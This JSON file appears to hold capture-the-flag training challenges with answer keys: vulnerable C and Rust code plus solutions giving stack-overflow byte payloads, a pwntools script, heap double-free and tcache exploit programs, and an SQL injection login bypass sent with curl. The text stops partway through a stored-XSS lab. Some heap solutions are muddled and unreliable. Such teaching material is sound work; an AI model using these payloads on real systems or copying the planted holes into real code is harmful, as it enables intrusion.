{
	"please_overflow_me":
	{
		"title": "Please overflow me",
		"description": "I've been feeling kinda... empty lately. Maybe a little buffer overflow will cheer me up!\n\nIn this challenge, you're given a simple binary with a small request: overflow it. Somewhere deep inside, there's a warm message waiting for you—maybe even a flag if you play your bytes right.\n\nCan you manipulate the program's memory to bring it to life?\n\n#include <stdlib.h>\n#include <unistd.h>\n#include <stdio.h>\n\nint main(int argc, char **argv)\n{\n    volatile int modified;\n    char buffer[64];\n\n    modified = 0;\n    printf(\"Please overflow me!\\n\");\n    gets(buffer);\n\n    if (modified != 0)\n    {\n        printf(\"Ah! I already feel better :)\\n\");\n        FILE *f = fopen(\"flag.txt\", \"r\");\n        if (f == NULL)\n        {\n            printf(\"Flag is not on the server\\nReach the admins!\");\n        }\n        else\n        {\n            char s;\n            while ((s = fgetc(f)) != EOF)\n            {\n                printf(\"%c\", s);\n            }\n            fclose(f);\n            exit(0);\n        }\n    }\n    else\n    {\n        printf(\"Try again?\\n\");\n    }\n}",
		"solution": "Solution:\n\nTo solve this challenge, you need to exploit a classic **buffer overflow** vulnerability.\n\nThe `gets()` function reads user input into a 64-byte buffer without bounds checking. Directly after the buffer in memory lies the `modified` variable. By inputting more than 64 bytes, you can overwrite `modified` with a non-zero value and trigger the condition that prints the flag.\n\nYou can craft the payload using Python:\n\n```python\npython3 -c \"print('A'*64 + '\\x01\\x00\\x00\\x00')\" | ./overflow_me\n```\n\nExplanation:\n\n'A'*64 fills the buffer.\n\n'\\x01\\x00\\x00\\x00' overwrites the modified variable with 1 (in little-endian).\n\nThe condition if (modified != 0) becomes true, and the flag is printed."
	},
	"revision":
	{
		"title": "Revision",
		"description": "They say knowledge is power... but calling the right function with the right magic might be even better.\n\nIn this binary, there's a special function hiding in plain sight, a function that holds the flag, but won't give it up easily. It demands the perfect incantation: two magical constants known only to the initiated. The only problem? It's never called.\n\nCan you trick the program into summoning them and claim your prize?\n\nvoid flag(int32_t arg1, int32_t arg2)\n{\n    if (arg1 != 0xdeadbeef || arg2 != 0xcafebabe)\n    {\n        puts(\"You are close but not there yet....\");\n        exit(1);\n    }\n    \n    puts(\"YOU DID IT!\\nHere is your flag :\");\n    FILE* fp = fopen(\"flag.txt\", u\"r...\");\n    void var_38;\n    fread(&var_38, 1, 0x28, fp);\n    puts(&var_38);\n    fclose(fp);\n    exit(0);\n}\n\nchar* vuln()\n{\n    puts(\"Tell me... Have you revised your exploits skills?\");\n    void buf;\n    return gets(&buf);\n}\n\nint32_t main()\n{\n    void* const __return_addr_1 = __return_addr;\n    void* var_10 = &arg_4;\n    vuln();\n    puts(\"You failed.\");\n    return 0;\n}",
		"solution": "Solution:\n\nThis binary hides the flag inside a `flag()` function, which is **never called**. To get the flag, you need to:\n\n1. Redirect execution to the `flag()` function using it's memory address in a little endian format.\n2. Provide it with the correct arguments: `0xdeadbeef` and `0xcafebabe` in a little endian format.\n3. Add a random/filler address in between the function address and the arguments (this mimics the return address after calling a function).\n\nThe vulnerable point is the use of `gets()` in the `vuln()` function, which reads into an unbounded buffer. This gives you an opportunity to overwrite the return address on the stack and control execution flow.\n\nThe goal is to **perform a Return-Oriented Programming (ROP) attack** or just return directly to `flag()`.\n\nYou can craft a payload like this:\n\n```bash\npython2.7 -c \"import sys; sys.stdout.write('A'*32 + b'\\xb6\\x91\\x04\\x08' + b'BBBB' + b'\\xef\\xbe\\xad\\xde' + b'\\xbe\\xba\\xfe\\xca')\" | ./revision\n```\n\nPayload breakdown:\n\n- `'A'*32`, fills the buffer up to the saved return address.\n- `b'\\xb6\\x91\\x04\\x08'`, address of `flag()` function (example, replace with real address).\n- `b'BBBB'`, filler for the \"fake return address\" after `flag()` is called.\n- `b'\\xef\\xbe\\xad\\xde'`, `0xdeadbeef` in little-endian (first argument).\n- `b'\\xbe\\xba\\xfe\\xca'`, `0xcafebabe` in little-endian (second argument)."
	},
	"dead_simple":
	{
		"title": "Dead Simple",
		"description": "Some say success is earned. Others just overwrite it.\n\nIn this binary, your job is simple: stop sucking. The program's only requirement for spawning a shell is that one little variable, correct, holds the right magic number: 0xdeadbeef. The thing is, it never gets set... at least not by the program itself.\n\nLooks like you've got a chance to make things right by \"correcting\" the stack.\n\nCan you flip a few bytes and win a shell?\n\n#include <stdio.h>\n#include <stdlib.h>\n\nint main(int argc, const char *argv[])\n{\n    int correct = 0;\n    char bof[64];\n\n    scanf(\"%s\",bof);\n\n    if(correct != 0xdeadbeef)\n    {\n        puts(\"you suck!\\n\");\n        exit(0);\n    }\n    puts(\"you win!\\n\");\n    system(\"/bin/sh\");\n\n    return 0;\n}",
		"solution": "Solution:\n\nThe goal is to overwrite the `correct` variable so that it holds the value `0xdeadbeef`. This will trigger the win condition and give you a shell via `system(\"/bin/sh\")`.\n\nThe vulnerability lies in this line:\n\n```c\nscanf(\"%s\", bof);\n```\n\nSince `scanf(\"%s\", ...)` does **not** limit the number of bytes read, it allows you to overflow the 64-byte `bof` buffer and overwrite the `correct` variable sitting just after it on the stack.\n\nHere's how to do it using Python and Pwntools:\n\n```python\nfrom pwn import *\nimport sys\n\n# Craft payload: 64 bytes of filler + 4 bytes to overwrite 'correct' variable\npayload = 64 * 'a'\npayload += p32(0xdeadbeef)\n\n# Output payload to be used in the exploit\nsys.stdout.write(payload)\n```\n\nPayload Breakdown:\n- `'a' * 64` fills the `bof` buffer.\n- `p32(0xdeadbeef)` writes the desired value in **little-endian format** to the next 4 bytes, the `correct` variable."
	},
	"echo_chamber":
	{
		"title": "Echo Chamber",
		"description": "Your input echoes deeper than you think...\n\nThis binary takes what you say and copies it—faithfully, carelessly.\nHidden in the chamber is a whisper of something more, but no one ever listens.\n\nCan you make your echo reach where it matters?\n\n#include <stdio.h>\n#include <string.h>\n\nvoid abuse() {\n    char command[] = \"/bin/sh\";\n    printf(\"%s\\n\", command);\n}\n\nint main(int argv, char **argc) {\n    char buf[256];\n\n    strcpy(buf, argc[1]);\n    return 0;\n}",
		"solution": "Solution:\n\nThe goal of this challenge is to redirect program execution to the hidden `abuse()` function, which prints `/bin/sh`.\n\nLooking at the source code:\n\n```c\nvoid abuse() {\n    char command[] = \"/bin/sh\";\n    printf(\"%s\\n\", command);\n}\n```\n\nThis function is never called in `main()`. However, the `main()` function contains this:\n\n```c\nchar buf[256];\nstrcpy(buf, argc[1]);\n```\n\nThe use of `strcpy()` makes this vulnerable to a **classic buffer overflow** since it doesn't check the length of the input being copied into `buf`.\n\n- The buffer `buf` is 256 bytes.\n- The return address sits just after the saved base pointer, meaning the offset to reach it is typically **260** bytes (256 + 4 for saved EBP on 32-bit systems).\n- If we overflow `buf` with a total of **260 bytes** followed by the address of `abuse()`, we can overwrite the return address and redirect execution.\n\nPayload Example (Using Python 2.7):\n\n```bash\npython2.7 -c \"import sys; sys.stdout.write('A'*260 + '\\x12\\x34\\x56\\x78')\" | ./echo_chamber dummy_arg\n```\n\nReplace `\\x12\\x34\\x56\\x78` with the actual little-endian address of the `abuse()` function, which you can find using `gdb` or by decompiling the program."
	},
	"double_trouble":
	{
		"title": "Double Trouble",
		"description": "They freed it once. Then they freed it again. Now it's your problem.\n\nSomewhere in the heap, things have gone terribly wrong. A function pointer hangs in memory, waiting for the right nudge. With no tcache to protect the allocator and ASLR turned off, all that stands between you and control is how well you can clean up someone else's mess.\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nvoid (*volatile func_ptr)();\n\nvoid hacked() {\n    printf(\"\uD83D\uDC80 Exploit Done! Opening a shell...\\n\");\n}\n\nint main() {\n    char *a = malloc(64);\n    char *b = a;\n\n    // Insert exploit code here\n\n    uintptr_t **fake_chunk = (uintptr_t **)e;\n    *fake_chunk = (uintptr_t *)&hacked;\n\n    func_ptr = *(void (**)())d;\n    func_ptr();\n\n    return 0;\n}",
		"solution": "Solution:\n\n1. **Allocate memory for two pointers**, `a` and `b`, where `b` points to the same memory as `a`.\n2. **Free `a`**, then **free `b`** to trigger the **double free** vulnerability.\n3. **Corrupt the heap** to overwrite a **function pointer** (`func_ptr`) to point to `hacked()`.\n4. **Trigger the overwritten function pointer** to execute the `hacked()` function.\n\nStep-by-Step Breakdown:\n\n1. Allocate Memory for Two Chunks:\n\nWe allocate memory for `a` and `b` (where `b` is set to point to the same memory as `a`):\n\n```c\nchar *a = malloc(64);\nchar *b = a;  // Both a and b point to the same block\n```\n\nAt this point, `a` and `b` both point to the same allocated memory chunk.\n\n2. Free the Chunks to Trigger the Double Free:\n\nNow, we perform the double free by freeing `a` and then freeing `b`. This will trigger a **double free** vulnerability.\n\n```c\nfree(a);  // Free first chunk\nfree(b);  // Free second chunk (double free!)\n```\n\nBecause `a` and `b` point to the same memory, calling `free(b)` after `free(a)` results in a **double free**, causing heap corruption.\n\n3. Corrupt the Heap and Overwrite the Function Pointer:\n\nWe now manipulate the heap by overwriting the function pointer `func_ptr` to point to the `hacked()` function. For this, we need to craft the exploit carefully.\n\nWe will assume that the function pointer `func_ptr` is stored at a location that can be overwritten by exploiting the double free. The goal is to control `func_ptr` so that it points to `hacked()`.\n\nThe vulnerable code would look something like this:\n\n```c\nuintptr_t **fake_chunk = (uintptr_t **)e;\n*fake_chunk = (uintptr_t *)&hacked;  // Overwrite function pointer with hacked's address\n```\n\nAfter that, we can trigger the overwritten function pointer to execute `hacked()`:\n\n```c\nfunc_ptr = *(void (**)())d;  // Retrieve the overwritten function pointer\nfunc_ptr();  // Call the function, which now points to hacked()\n```\n\nLet's assume that `e` and `d` are the locations where the corrupted function pointer resides.\n\n4. Full Exploit Code:\n\nHere's the complete solution that triggers the double free and overwrites the function pointer:\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nvoid (*volatile func_ptr)();\n\nvoid hacked() {\n    printf(\"\uD83D\uDC80 Exploit Done! Opening a shell...\\n\");\n}\n\nint main() {\n    // Allocate two blocks of memory\n    char *a = malloc(64);\n    char *b = a;  // b points to the same memory as a\n\n    printf(\"Address of a: %p\\n\", (void*)a);\n    printf(\"Address of b: %p\\n\", (void*)b);\n\n    // Trigger the double free vulnerability\n    free(a);  // Free first chunk\n    free(b);  // Free the same chunk again (double free)\n\n    // Now the heap is corrupted, and we can proceed to overwrite the function pointer\n\n    char *d = malloc(64); // Takes the adress of ‘a'\n    char *e = malloc(64); // Also takes the adress of ‘a'\n\n    // Overwrite function pointer with the address of 'hacked'\n    uintptr_t *fake_chunk = (uintptr_t *)e;  // Point to corrupted heap address\n    *fake_chunk = (uintptr_t)&hacked;  // Set the function pointer to hacked's address\n\n    // Trigger the overwritten function pointer\n    func_ptr = *(void (**)())d;  // Get the overwritten function pointer\n    func_ptr();  // Call func_ptr(), which will now call 'hacked()'\n\n    return 0;\n}\n```"
	},
	"tcache_tactics":
	{
		"title": "Tcache Tactics",
		"description": "They say memory management is tricky... but with the right touch, you can make it bend to your will.\n\nIn this binary, there's a hidden flaw, a vulnerability waiting to be exploited. The program, seemingly benign, hides a powerful secret: a double free waiting to be triggered. But it's not that simple. This system is protected by Tcache, ensuring that only the most clever exploiters can slip through the cracks.\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nvoid (*volatile func_ptr)();\n\nvoid hacked() {\n    printf(\"Exploit done ! Opening a shell...\\n\");\n}\n\nint main() {\n    char *a = malloc(64);\n    char *b = a;\n\n    // Insert exploitation code here\n\n    char *d = malloc(64);\n    char *e = malloc(64);\n\n    uintptr_t **fake_chunk = (uintptr_t **)e;\n    *fake_chunk = (uintptr_t *)&hacked;\n\n    func_ptr = *(void (**)())d;\n    func_ptr();\n\n    return 0;\n}",
		"solution": "Solution:\n\nTo exploit the **double free** vulnerability, bypass **Tcache** protection, and overwrite the function pointer, follow these steps:\n\n1. Allocate and Free Memory:\n   - The program starts by allocating memory for `a` and `b`, where `b` points to `a`. Then, we allocate 7 more chunks (`fill[7]`) to fill up the Tcache.\n   - Afterward, we free the allocated chunks in order to fill the Tcache with the freed memory blocks.\n\n2. Double Free:\n   - We then proceed to free `a` and immediately free `b`. Since `b` points to the same memory as `a`, this triggers a **double free** vulnerability.\n\n3. Bypassing Tcache:\n   - To avoid detection from Tcache, we allocate 7 more chunks to effectively clear the Tcache and make `a` available for reallocation.\n   - After this, we can safely free `b` without triggering any issues in Tcache.\n\n4. Corrupting the Heap:\n   - Now that the heap has been manipulated, we can use the `malloc()` calls to allocate new memory blocks (`d` and `e`).\n   - `e` now points to a chunk where we can overwrite its contents. By writing the address of the `hacked()` function into this chunk, we can control the execution flow.\n\n5. Overwriting the Function Pointer:\n   - Finally, we assign the value of the function pointer (`func_ptr`) to the address stored in `d`, which now points to the overwritten function pointer in `e`.\n   - Calling `func_ptr()` triggers the `hacked()` function, opening a shell.\n\nCode Solution:\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nvoid (*volatile func_ptr)();\n\nvoid hacked() {\n    printf(\"Exploit done! Opening a shell...\\n\");\n}\n\nint main() {\n    char *a = malloc(64);\n    char *b = a;\n    char *fill[7];\n    \n    // Step 1: Fill the Tcache with extra allocations\n    for (int i = 0; i < 7; i++) {\n        fill[i] = malloc(64);\n    }\n\n    // Step 2: Free the Tcache chunks\n    for (int i = 0; i < 7; i++) {\n        free(fill[i]); \n    }\n    \n    // Step 3: Free 'a' and fill the Tcache\n    free(a);\n    for (int i = 0; i < 7; i++) {\n        malloc(64);\n    }\n\n    // Step 4: Trigger the double free vulnerability\n    free(b);\n\n    // Step 5: Allocate new chunks\n    char *d = malloc(64);\n    char *e = malloc(64);\n\n    // Step 6: Overwrite the function pointer in 'e'\n    uintptr_t **fake_chunk = (uintptr_t **)e;\n    *fake_chunk = (uintptr_t *)&hacked;\n\n    // Step 7: Execute the function pointer to gain a shell\n    func_ptr = *(void (**)())d;\n    func_ptr();\n\n    return 0;\n}\n```"
	},
	"slug_overflow":
	{
		"title": "Slug Overflow",
		"description": "Your task is to help our little slugger program safely turn any input word into a slugified string lowercase letters only, everything else replaced by dashes.\nUnfortunately, the developer left behind a buggy implementation. When users run the program, it crashes or behaves strangely.\nYour mission is to:\n\nFind the bug (using proper debugging tools GDB or Valgrind, NOT by sprinkling printf everywhere).\nUnderstand why it crashes or corrupts memory.\nFix the bug to make the program safely handle input and produce correct slugs.\n\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define MAX_INPUT_SIZE 100\n\n/**\n * Asks the user for a non empty input.\n *\n * @param question The question to ask the user.\n * @return The non empty input, it must be freed by the caller.\n */\nchar *input(char *question) {\n    char *result = (char *)malloc(MAX_INPUT_SIZE);\n\n    printf(\"%s\", question);\n\n    fgets(result, MAX_INPUT_SIZE, stdin);\n\n    result[strlen(result) - 1] = '\\0';  // Remove the newline character\n\n    return result;\n}\n\n/**\n * Returns the slug version of a word.\n *\n * @param word The word to slugify.\n * @param result The slug version of the word.\n */\nvoid slugify(char *word, char *result) {\n    int i;\n\n    for (i = 0; word[i] != '\\0'; i++) {\n        if ('a' <= word[i] && word[i] <= 'z') {\n            result[i] = word[i];\n        } else if ('A' <= word[i] && word[i] <= 'Z') {\n            result[i] = word[i] + 32;\n        } else {\n            result[i] = '-';\n        }\n    }\n\n    result[i] = '\\0';\n}\n\n/**\n * The main function. Asks the user for a word and prints its slug version.\n */\nint main(void) {\n    char *word = input(\"Enter a word: \");\n    char slug[64];\n\n    slugify(word, slug);\n\n    printf(\"Slug: %s\\n\", slug);\n\n    free(word);\n\n    return EXIT_SUCCESS;\n}",
		"solution": "The issue resides in the fact that the slug buffer is of size 64 when the MAX_INPUT_SIZE is of size 100.\nTo fix the issue, we can either change the slug buffer to be 100 or the MAX_INPUT_SIZE to be 64."
	},
	"free_my_palindrome":
	{
		"title": "Free My Palindrome",
		"description": "Oh no! The Palindrome Checker app has been captured by sneaky memory goblins.\nYour mission is to free the palindromes and help the program correctly report which combined strings are palindromes without causing memory corruption or crashes.\nYou're given the following C program that combines two strings, checks if the result is a palindrome, and reports the result.\nHowever, something is wrong: memory management is buggy, causing double frees or invalid frees!\nThe key vulnerability lurks in how memory is freed inside the is_palindrome and print_palindrome functions.\nYour job is to analyze the code, find the flawed memory handling, and fix it so the program works correctly and safely.\n\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n/**\n * Combine two strings.\n *\n * @param string1 The first string.\n * @param string2 The second string.\n * @return The combined string.\n */\nchar *combine_strings(char *string1, char *string2) {\n    int length1 = strlen(string1);\n    int length2 = strlen(string2);\n\n    char *result = malloc(length1 + length2 + 1);\n\n    strcpy(result, string1);\n    strcpy(result + length1, string2);\n\n    return result;\n}\n\n/**\n * Check if a string is a palindrome.\n *\n * @param string The string to check.\n * @return true if the string is a palindrome, false otherwise.\n */\nbool is_palindrome(char *string) {\n    int length = strlen(string);\n\n    for (int i = 0; i < length / 2; i++) {\n        if (string[i] != string[length - 1 - i]) {\n            return false;\n        }\n    }\n\n    free(string);\n\n    return true;\n}\n\n/**\n * Print if a string is a palindrome.\n *\n * @param string The string to check.\n */\nvoid print_palindrome(char *string) {\n    printf(\"%s\", string);\n    if (is_palindrome(string)) {\n        printf(\" is a palindrome.\\n\");\n    } else {\n        printf(\" is not a palindrome.\\n\");\n    }\n    free(string);\n}\n\n/**\n * Main function.\n */\nint main(void) {\n    char *string1 = \"Hello, \";\n    char *string2 = \"world!\";\n    char *string3 = \"kay\";\n    char *string4 = \"ak\";\n\n    char *combined1 = combine_strings(string1, string2);\n    print_palindrome(combined1);\n\n    char *combined2 = combine_strings(string3, string4);\n    print_palindrome(combined2);\n\n    char *combined3 = combine_strings(string1, string3);\n    print_palindrome(combined3);\n\n    free(combined1);\n    free(combined2);\n    free(combined3);\n\n    return EXIT_SUCCESS;\n}",
		"solution": "The issue resides in the fact that the combined strings are freed inside the is_palindrome and print_palindrome functions.\nTo fix the issue, we can either remove the free calls inside these functions or move them to the main function after all checks are done."
	},
	"factorial_frenzy":
	{
		"title": "Factorial Frenzy",
		"description": "They say numbers never lie... but sometimes they wrap around in the most unexpected ways.\n\nIn this binary, a simple mathematical calculation hides a dangerous flaw a vulnerability waiting for the right input.\nThe program, eager to compute large factorials, overlooks a critical detail, the limits of its own data types.\nWith no safeguards against integer overflow, the result quietly wraps past the maximum, twisting massive numbers into small or even negative values.\nBut it's not as easy as just typing a big number. Only those who understand the delicate dance between data types and memory can exploit this overflow to make the program behave unexpectedly.\nWill you find the right input to break the limits of this calculation?\n\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n\n#define MAX_INT 2147483647\n\n/**\n * Calculate the factorial of a number\n * @param n The number, must be greater than 0\n * @return The factorial of the number\n */\nint factorial(int n) {\n    int result = 1;\n\n    for (int i = 1; i <= n; i++) {\n        result *= i;\n    }\n\n    return result;\n}\n\n/**\n * The main function. It calculates the number of possible permutations of n\n * objects.\n */\nint main(void) {\n    char buffer[256];\n\n    printf(\"Enter the number of objects: \");\n    fgets(buffer, sizeof(buffer), stdin);\n\n    int n = atoi(buffer);\n\n    if (n <= 0) {\n        printf(\"The number of objects must be greater than 0.\\n\");\n        return EXIT_FAILURE;\n    }\n\n    if (n > MAX_INT) {\n        printf(\"The number of objects must be less than or equal to %d.\\n\",\n               MAX_INT);\n        return EXIT_FAILURE;\n    }\n\n    int result = factorial(n);\n\n    printf(\"The number of possible permutations of %d objects is %d.\\n\", n,\n           result);\n\n    return EXIT_SUCCESS;\n}\n",
		"solution": "Solution:\n\nThe goal of this challenge is to exploit an **integer overflow** vulnerability in the `factorial()` function.\n\nThe `factorial()` function calculates the factorial of a number `n` using a simple loop. However, it does not check for integer overflow, which can occur when `n` is large enough.\n\n### Steps to Exploit:\n1. **Input a Large Number:**\n   - The program accepts user input for `n`, which is then converted to an integer using `atoi()`. If you input a large number (greater than 12), the factorial will exceed the maximum value of a 32-bit signed integer (`MAX_INT`), causing an overflow.\n\n2. **Triggering Overflow:**\n   - For example, if you input `13`, the factorial calculation will result in `13! = 6227020800`, which exceeds the maximum value of a signed 32-bit integer (`2147483647`). This will cause the result to wrap around and become negative or a small positive number.\n\n3. **Check for Negative Result:**\n   - The program does not handle negative results properly, so it may lead to unexpected behavior or crashes.\n\n### Example Input:\n```bash\necho \"13\" | ./factorial_frenzy\n```\n\n### Code Solution:\nYou can modify the code to check for overflow before performing the multiplication in the `factorial()` function:\n```c\nif (result > MAX_INT / i) {\n    printf(\"Overflow occurred!\\n\");\n    return -1;\n}\n```\nThis way, you can prevent the overflow and handle it gracefully."
	},
	"fragile_input":
	{
		"title": "Fragile Input",
		"description": "You've been handed a small utility that asks the user for several words and prints them back in uppercase and reverse order.\nBut there's a hidden flaw in how it handles memory during input something subtle, but critical.\nYour task is to carefully review the code, identify the memory management issue, and patch it so the program runs safely without causing undefined behavior.\nCan you spot the fragile piece and make it robust?\n\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define MAX_INPUT_SIZE 100\n\n/**\n * Asks the user for a non empty input.\n *\n * @param question The question to ask the user.\n * @return The non empty input.\n */\nchar *input(char *question) {\n    char *result = NULL;\n    int size = 0;\n\n    do {\n        char input[MAX_INPUT_SIZE];\n\n        printf(\"%s\", question);\n\n        fgets(input, MAX_INPUT_SIZE, stdin);\n\n        size = strlen(input);\n\n        result = input;\n    } while (size == 0);\n\n    result[size - 1] = '\\0';  // Remove the newline character\n\n    return result;\n}\n\n/**\n * Asks the user for a positive number.\n *\n * @param question The question to ask the user.\n * @return The positive number.\n */\nlong input_number(char *question) {\n    long number = 0;\n    char *last_char = NULL;\n    char *endptr = NULL;\n\n    do {\n        char *number_string = input(question);\n\n        // Convert the string to a long in base 10\n        number = strtol(number_string, &endptr, 10);\n\n        // Get the last character of the string\n        last_char = &number_string[strlen(number_string)];\n\n        // Check if there was no conversion error and if the number is positive\n    } while (number <= 0 || endptr != last_char);\n\n    return number;\n}\n\n/**\n * Returns the uppercase version of a word.\n *\n * @param word The word to convert to uppercase.\n * @return The uppercase version of the word.\n */\nchar *uppercase(char *word) {\n    int size = strlen(word);\n\n    char *result = malloc(size + 1);\n\n    for (int i = 0; i < size; i++) {\n        // Convert the character to uppercase if it is a lowercase letter\n        if ('a' <= word[i] && word[i] <= 'z') {\n            result[i] = word[i] - 32;\n        } else {\n            result[i] = word[i];\n        }\n    }\n\n    result[size] = '\\0';\n\n    return result;\n}\n\n/**\n * Asks the user for a number of words and then for each word, prints the\n * uppercase version of the word in reverse order.\n */\nint main(void) {\n    long number = input_number(\"Enter the number of words to enter: \");\n\n    char *words[number];\n\n    for (int i = 0; i < number; i++) {\n        char *word = input(\"Enter a word: \");\n        words[i] = word;\n        printf(\"You entered %s as word %d\\n\", words[i], i + 1);\n    }\n\n    for (int i = 0; i < number; i++) {\n        char *word = uppercase(words[number - 1 - i]);\n\n        printf(\"%s\\n\", word);\n\n        free(word);\n    }\n\n    return EXIT_SUCCESS;\n}",
		"solution": "Solution:\n\nThe issue resides in the fact that the input function returns a pointer to a local variable. To fix the issue, we can either change the input function to return a dynamically allocated string or copy the string into a dynamically allocated buffer before returning it."
	},
	"rusty_login":
	{
		"title": "Rusty Login",
		"description": "This lab is a login portal built with Rust and SQLite. It uses raw SQL queries to validate user credentials.\nYour goal is to log in as the admin user, even though you don't know their password.\n\npub fn auth_router() -> Router<DatabasePool> {\n    axum::Router::new()\n        .route(\n            \"/login\",\n            axum::routing::get(async || {\n                render_template(LoginTemplate {\n                    user_info: UserInfo::default(),\n                    error: String::new(),\n                })\n            })\n            .post(\n                async |mut auth_session: AuthSession, Valid(Form(form)): Valid<Form<AuthForm>>| {\n                    match auth_session.authenticate(form.into()).await {\n                        Ok(Some(user)) => match auth_session.login(&user).await {\n                            Ok(_) => Redirect::to(\"/home\").into_response(),\n                            Err(_) => StatusCode::INTERNAL_SERVER_ERROR.into_response(),\n                        },\n                        Ok(None) => render_template(LoginTemplate {\n                            user_info: UserInfo::default(),\n                            error: String::from(\"Nom d'utilisateur ou mot de passe incorrect\"),\n                        }),\n                        Err(_) => StatusCode::INTERNAL_SERVER_ERROR.into_response(),\n                    }\n                },\n            ),\n        )\n}\n\nimpl<'a> AuthnBackend for Backend {\n    type User = User;\n    type Credentials = Credentials;\n    type Error = sqlx::Error;\n\n    async fn authenticate(\n        &self,\n        Credentials { username, password }: Self::Credentials,\n    ) -> Result<Option<Self::User>, Self::Error> {\n        match User::check_credentials(&self.pool, &username, &hash_password(&password)).await {\n            Ok(user) => Ok(Some(user)),\n            Err(e) => match sqlx::Error::RowNotFound {\n                sqlx::Error::RowNotFound => Ok(None),\n                _ => Err(e),\n            },\n        }\n    }\n\n    async fn get_user(&self, user_id: &UserId<Self>) -> Result<Option<Self::User>, Self::Error> {\n        match User::find(&self.pool, *user_id).await {\n            Ok(user) => Ok(Some(user)),\n            Err(e) => match sqlx::Error::RowNotFound {\n                sqlx::Error::RowNotFound => Ok(None),\n                _ => Err(e),\n            },\n        }\n    }\n}\n\nimpl User {\n    pub async fn create(\n        pool: &Pool<Sqlite>,\n        username: &str,\n        password: &str,\n        is_admin: bool,\n    ) -> sqlx::Result<User> {\n        let hash = hash_password(password);\n        sqlx::query_as!(\n            User,\n            \"\n            INSERT INTO user (username, password_hash, is_admin)\n            VALUES (?, ?, ?)\n            RETURNING id, password_hash, is_admin\n            \",\n            username,\n            hash,\n            is_admin\n        )\n        .fetch_one(pool)\n        .await\n    }\n\n    pub async fn find(pool: &Pool<Sqlite>, id: i64) -> sqlx::Result<User> {\n        sqlx::query_as!(\n            User,\n            \"\n            SELECT id, password_hash, is_admin\n            FROM user\n            WHERE id = ?\n            \",\n            id\n        )\n        .fetch_one(pool)\n        .await\n    }\n\n    pub async fn check_credentials(\n        pool: &Pool<Sqlite>,\n        username: &str,\n        password_hash: &str,\n    ) -> sqlx::Result<User> {\n        sqlx::raw_sql(&format!(\n            \"\n            SELECT id, password_hash, is_admin\n            FROM user\n            WHERE username = '{}' AND password_hash = '{}'\n            \",\n            username, password_hash\n        ))\n        .fetch_one(pool)\n        .await\n        .map(|row| User {\n            id: row.get(\"id\"),\n            password_hash: row.get(\"password_hash\"),\n            is_admin: row.get(\"is_admin\"),\n        })\n    }\n}\n\nimpl AuthUser for User {\n    type Id = i64;\n\n    fn id(&self) -> Self::Id {\n        self.id\n    }\n\n    fn session_auth_hash(&self) -> &[u8] {\n        &self.password_hash.as_bytes()\n    }\n}",
		"solution": "Solution:\n\nThe goal of this challenge is to exploit the SQL injection vulnerability in the `check_credentials` function to bypass authentication and log in as the admin user.\n\n### Steps to Exploit:\n1. **Understand the SQL Injection Vulnerability:**\n   - The `check_credentials` function constructs a raw SQL query using user input without proper sanitization, making it vulnerable to SQL injection.\n   - The query is constructed using string interpolation, which allows an attacker to inject arbitrary SQL code.\n\n2. **Injecting Malicious SQL Code:**\n   - To log in as the admin user, we can manipulate the `username` and `password_hash` parameters in the SQL query.\n   - By providing a specially crafted input, we can bypass the password check and log in as the admin user.\n\n3. **Example Payload:**\n   - For example, if we set `username` to `admin' OR '1'='1` and `password_hash` to `anything`, the resulting SQL query would look like this:\n     ```sql\n     SELECT id, password_hash, is_admin\n     FROM user\n     WHERE username = 'admin' OR '1'='1' AND password_hash = 'anything'\n     ```\n   - This query will always return true for the username check because `'1'='1'` is always true, allowing us to bypass authentication.\n\n4. **Using Curl or Postman:**\n   - You can use tools like Curl or Postman to send a POST request with the malicious payload:\n     ```bash\n     curl -X POST -d \"username=admin' OR '1'='1&password_hash=anything\" http://localhost:8000/login\n     ```\n   - This should log you in as the admin user without needing to know their password."
	},
	"comment_injection":
	{
		"title": "Comment Injection",
		"description": "This lab contains a comment section where users can post formatted HTML.\nSolve the lab by injecting a script that causes an alert to pop up when another user views your comment.\n\n<section class=\"comments\">\n  <h2>Avis</h2>\n  <ul class=\"comment-list\">\n    {% for comment in comments %}\n    <li class=\"comment-item\">\n      <div class=\"comment-author\">{{ comment.author }}</div>\n\n      <!-- We want our users to be able to use colours, italics and bold in comments using HTML -->\n      <div class=\"comment-text\">{{ comment.content|safe }}</div>\n\n      {% if user_info.id == comment.author_id %}\n      <form action=\"/comments/delete\" method=\"POST\" class=\"comment-form\">\n        <input type=\"hidden\" name=\"id\" value=\"{{ comment.id }}\" />\n        <button type=\"submit\">Supprimer</button>\n      </form>\n      {% endif %}\n    </li>\n    {% endfor %}\n  </ul>\n\n  {% if user_info.is_authenticated %}\n  <form action=\"/comments/create\" method=\"POST\" class=\"comment-form\">\n    <label for=\"content\">Ajouter un avis :</label>\n    <textarea name=\"content\" rows=\"4\" required></textarea>\n    <button type=\"submit\">Envoyer</button>\n  </form>\n  {% else %}\n  <p>\n    Pour ajouter un avis, veuillez vous\n    <a href=\"/auth/login\">connecter</a>.\n  </p>\n  {% endif %}\n\n</section>\n\npub fn home_router() -> Router<DatabasePool> {\n    axum::Router::new().route(\n        \"/\",\n        axum::routing::get(\n            async |auth_session: AuthSession, State(pool): State<DatabasePool>| {\n                match Comment::find_all(&pool).await {\n                    Ok(comments) => render_template(HomeTemplate {\n                        user_info: UserInfo::from(auth_session.user),\n                        comments,\n                    }),\n                    Err(_) => StatusCode::INTERNAL_SERVER_ERROR.into_response(),\n                }\n            },\n        ),\n    )\n}\n\nimpl Comment {\n    pub async fn find_all(pool: &Pool<Sqlite>) -> sqlx::Result<Vec<Comment>> {\n        sqlx::query_as!(\n            Comment,\n            \"\n            SELECT c.id, c.content, u.username AS author, u.id AS author_id\n            FROM comment c\n            JOIN user u ON c.authorId = u.id\n            \"\n        )\n        .fetch_all(pool)\n        .await\n    }\n\n    pub async fn create(pool: &Pool<Sqlite>, content: &str, author_id: i64) -> sqlx::Result<()> {\n        sqlx::query!(\n            \"\n            INSERT INTO comment 